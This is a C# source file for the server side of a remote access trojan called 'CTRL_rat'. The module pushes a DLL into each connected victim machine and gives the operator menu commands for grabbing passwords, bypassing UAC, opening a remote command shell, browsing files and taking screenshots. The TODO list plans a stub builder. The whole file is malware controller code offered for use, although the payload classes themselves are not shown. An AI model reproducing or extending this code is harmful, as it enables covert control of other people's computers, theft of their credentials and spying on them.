using CTRL_rat_Server;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Server_plugin_dll;
using System.Threading;
namespace CTRL_module
{
    public class Main
    {
        public List<string> commands = new List<string>();
        public CTRL_rat_Server.Main parent;
        public List<object> forms = new List<object>();
        public string workerid;
        public bool loaded = false;
        public void Wait_for_Load() 
        {
            while (!loaded) 
            {
                Thread.Sleep(500);
            }
        }
        public byte[] objecttobyte(object[] e)
        {
            int len = 0;
            byte[] built = new byte[e.Length];
            foreach (int i in e)
            {
                built[len] = Convert.ToByte(i);
                len++;
            }
            return built;
        }
        public void ContactForms(node client, Dictionary<object, object> response) 
        {
            foreach (var i in forms) 
            {
                dynamic d = i;
                d.OnMessage(client, response);
            }
        }
        public void OnConnect(node client, Dictionary<object, object> authresponse) 
        {
            string clientdlldir = Path.Combine(Directory.GetCurrentDirectory(), "plugin\\Client");
            var g = client.get_or_create_worker_node(workerid);
            parent.Send_and_load_dll(g, File.ReadAllBytes(Path.Combine(clientdlldir, "test.dll")));
            loaded = true;
            //Recomended to load requires here
            /*
             var g = client.get_or_create_worker_node(workerid);
             parent.Send_and_load_dll(g, File.ReadAllBytes(Path.Combine(clientdlldir, "test.dll")));
             */
            //make it so all the functions will wait untill the dll is loaded....well the plugin creator has to do that
            //MessageBox.Show(authresponse["username"].ToString());
        }
        public void OnMessage(node client, Dictionary<object, object> response)
        {
            ContactForms(client, response);
        }
        public void OnClose(node client)
        {
            //MessageBox.Show(client.hwid);
        }
        public void OnCommandClick(string option, node client) 
        {
            if (workerid == null) workerid = client.generate_random_id();
            string serverdlldir = Path.Combine(Directory.GetCurrentDirectory(), "plugin\\Server");
            Dictionary<object, object> response = new Dictionary<object, object>();
            Wait_for_Load();
            if (option == "Grab Password")
            {
                var temp = new pwd(client, parent);
                forms.Add((object)temp);
                new Thread(() => Application.Run(temp)).Start();
            }
            else if (option == "File Manager")
            {
                var temp = new filemgr(client, parent);
                forms.Add((object)temp);
                new Thread(() => Application.Run(temp)).Start();
            }
            else if (option == "Idle Time")
            {
                var temp = new idletime(client, parent);
                forms.Add((object)temp);
                new Thread(() => Application.Run(temp)).Start();
            }
            else if (option == "UAC Bypass")
            {
                var temp = new uacbypass(client, parent);
                forms.Add((object)temp);
                new Thread(() => Application.Run(temp)).Start();
            }
            else if (option == "Exit")
            {

                response["op"] = "close";
                client.Send(client.sock, Encoding.UTF8.GetBytes(client.DictionaryToJson(response)));
            }
            else if (option == "Restart Client")
            {
                response["op"] = "progrestart";
                client.Send(client.sock, Encoding.UTF8.GetBytes(client.DictionaryToJson(response)));
            }
            else if (option == "CMD")
            {
                var temp = new CMD(client, parent);
                forms.Add((object)temp);
                new Thread(() => Application.Run(temp)).Start();
            }
            else if (option == "Emerg Exit (if other exit doest work)") 
            {
                response["op"] = "EREXIT";
                client.Send(client.sock, Encoding.UTF8.GetBytes(client.DictionaryToJson(response)));
            }
            else if (option == "Emerg Restart (if other restart doesnt work)")
            {
                response["op"] = "ERSTART";
                client.Send(client.sock, Encoding.UTF8.GetBytes(client.DictionaryToJson(response)));
            }
            else if (option == "Screenshot")
            {
                var temp = new screenshot(client, parent);
                forms.Add((object)temp);
                new Thread(() => Application.Run(temp)).Start();
            }
        }
        public void Init(CTRL_rat_Server.Main _parent)
        {
            workerid = new node().generate_random_id();
            parent = _parent;
            commands.Add("Grab Password");
            commands.Add("File Manager");
            commands.Add("UAC Bypass");
            commands.Add("Idle Time");
            commands.Add("CMD");
            commands.Add("Restart Client");
            commands.Add("Screenshot");
            commands.Add("Exit");
            commands.Add("");
            commands.Add("");
            commands.Add("Emerg Exit (if other exit doest work)");
            commands.Add("Emerg Restart (if other restart doesnt work)");
            return;
        }
    }
}
//TODO
/*
 * Find and solve why the client and server are comsuming a large amount of cpu usage - sovled!
 * Add code to each of the forms to dispose of the worker sockets when done, also hook into the form close and dispose of everything (taking up the client memory)
 * For CMD, add code to close the prevoius app_id (taking up memory as a subprocess and then not being closed), client also detect the on close and do some clean up
 * Add a builder for the stub (or not idk yet)
 * also maybe add timeouts to the while loops that like waiting for a value in a dictionary (save_and_load_dll) (something like that)
*/